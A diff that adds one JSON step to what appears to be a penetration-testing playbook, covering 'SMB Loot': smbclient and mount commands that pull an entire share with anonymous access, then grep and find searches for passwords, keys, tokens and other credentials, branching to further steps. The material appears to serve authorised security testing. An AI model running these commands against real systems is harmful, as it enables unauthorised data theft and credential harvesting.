@@ -1,0 +1,22 @@
+{
+  "id": "smb_loot",
+  "phase": "SMB",
+  "title": "SMB Loot",
+  "body": "Recursively download everything. Grep for credentials, keys, configs. Don't read files one by one — bulk download and grep.",
+  "cmd": "# Recursive download\nsmbclient //$ip/share -N \\\n  -c 'recurse ON; prompt OFF; mget *'\n\n# Mount the share\nsudo mount -t cifs //$ip/share /mnt/share \\\n  -o username=,password=,vers=2.0\n\n# Bulk grep for creds\ngrep -rih \"password\\|passwd\\|secret\\|api_key\\|token\\|credential\" /mnt/share/\nfind /mnt/share -name \"*.xml\" -o -name \"*.config\" \\\n  -o -name \"*.ini\" -o -name \"*.txt\" \\\n  -o -name \"*.ps1\" -o -name \"*.bat\" \\\n  | xargs grep -il \"pass\" 2>/dev/null",
+  "warn": null,
+  "choices": [
+    {
+      "label": "Found credentials",
+      "next": "creds_found"
+    },
+    {
+      "label": "Found scripts/code — review them",
+      "next": "code_review"
+    },
+    {
+      "label": "Found SSH key",
+      "next": "ssh_key"
+    }
+  ]
+}
